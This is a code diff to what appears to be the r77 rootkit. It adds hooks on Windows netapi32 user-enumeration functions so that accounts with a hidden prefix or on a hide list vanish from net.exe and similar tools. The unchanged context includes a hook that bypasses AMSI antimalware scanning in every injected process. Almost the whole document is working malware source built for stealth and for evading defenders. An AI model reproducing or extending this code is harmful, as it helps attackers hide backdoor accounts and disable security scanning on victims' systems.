@@ -29,6 +29,9 @@ static NT_SAMQUERYDISPLAYINFORMATION OriginalSamQueryDisplayInformation;
 static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
+static NT_NETUSERENUM OriginalNetUserEnum;
+static NT_NETLOCALGROUPGETMEMBERS OriginalNetLocalGroupGetMembers;
+static NT_NETQUERYDISPLAYINFORMATION OriginalNetQueryDisplayInformation;
 
 static DWORD TlsNtEnumerateKeyCacheKey;
 static DWORD TlsNtEnumerateKeyCacheIndex;
@@ -63,12 +66,16 @@ VOID InitializeHooks()
 	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
+	InstallHook("netapi32.dll", "NetUserEnum", (LPVOID*)&OriginalNetUserEnum, HookedNetUserEnum);
+	InstallHook("netapi32.dll", "NetLocalGroupGetMembers", (LPVOID*)&OriginalNetLocalGroupGetMembers, HookedNetLocalGroupGetMembers);
+	InstallHook("netapi32.dll", "NetQueryDisplayInformation", (LPVOID*)&OriginalNetQueryDisplayInformation, HookedNetQueryDisplayInformation);
 	DetourTransactionCommit();
 
 	// Usually, ntdll.dll should be the only DLL to hook.
 	// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
 	// The EnumService* methods from advapi32.dll access services.exe through RPC.
 	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
+	// Similar case for NetAPI32 user enumeration functions - they access the SAM database through RPC.
 
 	// The same applies to a select few other functions as well. HOWEVER: Any function that is exposed in ntdll WILL be hooked there, not in higher level DLLs.
 
@@ -105,6 +112,9 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
+	UninstallHook(OriginalNetUserEnum, HookedNetUserEnum);
+	UninstallHook(OriginalNetLocalGroupGetMembers, HookedNetLocalGroupGetMembers);
+	UninstallHook(OriginalNetQueryDisplayInformation, HookedNetQueryDisplayInformation);
 	DetourTransactionCommit();
 
 	TlsFree(TlsNtEnumerateKeyCacheKey);
@@ -906,6 +916,136 @@ static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, UL
 	// Bypass AMSI in every process that is injected with r77.
 
 	return 0x80070057;
+}
+static DWORD WINAPI HookedNetUserEnum(LPCWSTR servername, DWORD level, DWORD filter, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD resume_handle)
+{
+	// Hide users from net.exe user command
+	DWORD result = OriginalNetUserEnum(servername, level, filter, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);
+
+	// Only process level 0 (USER_INFO_0) which contains just the username
+	// This is what net.exe user uses
+	if (result == NERR_Success && level == 0 && bufptr && *bufptr && entriesread && *entriesread > 0)
+	{
+		PNT_USER_INFO_0 users = (PNT_USER_INFO_0)*bufptr;
+		DWORD originalCount = *entriesread;
+		DWORD newCount = 0;
+
+		for (DWORD i = 0; i < originalCount; i++)
+		{
+			BOOL hidden = FALSE;
+
+			if (users[i].usri0_name)
+			{
+				if (HasPrefix(users[i].usri0_name) || IsUserNameHidden(users[i].usri0_name))
+				{
+					hidden = TRUE;
+				}
+			}
+
+			if (!hidden)
+			{
+				if (newCount != i)
+				{
+					users[newCount] = users[i];
+				}
+				newCount++;
+			}
+		}
+
+		*entriesread = newCount;
+		if (totalentries) *totalentries = *totalentries - (originalCount - newCount);
+	}
+
+	return result;
+}
+static DWORD WINAPI HookedNetLocalGroupGetMembers(LPCWSTR servername, LPCWSTR localgroupname, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD_PTR resume_handle)
+{
+	// Hide users from net.exe localgroup <groupname> command
+	DWORD result = OriginalNetLocalGroupGetMembers(servername, localgroupname, level, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);
+
+	// Only process level 3 (LOCALGROUP_MEMBERS_INFO_3) which contains domain\name format
+	// This is what net.exe localgroup administrators uses
+	if (result == NERR_Success && level == 3 && bufptr && *bufptr && entriesread && *entriesread > 0)
+	{
+		PNT_LOCALGROUP_MEMBERS_INFO_3 members = (PNT_LOCALGROUP_MEMBERS_INFO_3)*bufptr;
+		DWORD originalCount = *entriesread;
+		DWORD newCount = 0;
+
+		for (DWORD i = 0; i < originalCount; i++)
+		{
+			BOOL hidden = FALSE;
+
+			if (members[i].lgrmi3_domainandname)
+			{
+				// The name is in format "DOMAIN\Username" or just "Username"
+				// Extract just the username part
+				LPCWSTR username = members[i].lgrmi3_domainandname;
+				LPCWSTR backslash = StrChrW(username, L'\\');
+				if (backslash)
+				{
+					username = backslash + 1;
+				}
+
+				if (HasPrefix(username) || IsUserNameHidden(username))
+				{
+					hidden = TRUE;
+				}
+			}
+
+			if (!hidden)
+			{
+				if (newCount != i)
+				{
+					members[newCount] = members[i];
+				}
+				newCount++;
+			}
+		}
+
+		*entriesread = newCount;
+		if (totalentries) *totalentries = *totalentries - (originalCount - newCount);
+	}
+
+	return result;
+}
+static DWORD WINAPI HookedNetQueryDisplayInformation(LPCWSTR servername, DWORD level, DWORD index, DWORD entriesrequested, DWORD preferredmaximumlength, LPDWORD returnedentrycount, LPVOID *sortedBuffer)
+{
+	// Hide users from various tools that use NetQueryDisplayInformation
+	DWORD result = OriginalNetQueryDisplayInformation(servername, level, index, entriesrequested, preferredmaximumlength, returnedentrycount, sortedBuffer);
+
+	// Only process level 1 (NET_DISPLAY_USER) which contains user information
+	if (result == NERR_Success && level == 1 && sortedBuffer && *sortedBuffer && returnedentrycount && *returnedentrycount > 0)
+	{
+		PNT_NET_DISPLAY_USER users = (PNT_NET_DISPLAY_USER)*sortedBuffer;
+		DWORD originalCount = *returnedentrycount;
+		DWORD newCount = 0;
+
+		for (DWORD i = 0; i < originalCount; i++)
+		{
+			BOOL hidden = FALSE;
+
+			if (users[i].usri1_name)
+			{
+				if (HasPrefix(users[i].usri1_name) || IsUserNameHidden(users[i].usri1_name))
+				{
+					hidden = TRUE;
+				}
+			}
+
+			if (!hidden)
+			{
+				if (newCount != i)
+				{
+					users[newCount] = users[i];
+				}
+				newCount++;
+			}
+		}
+
+		*returnedentrycount = newCount;
+	}
+
+	return result;
 }
 
 static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter)
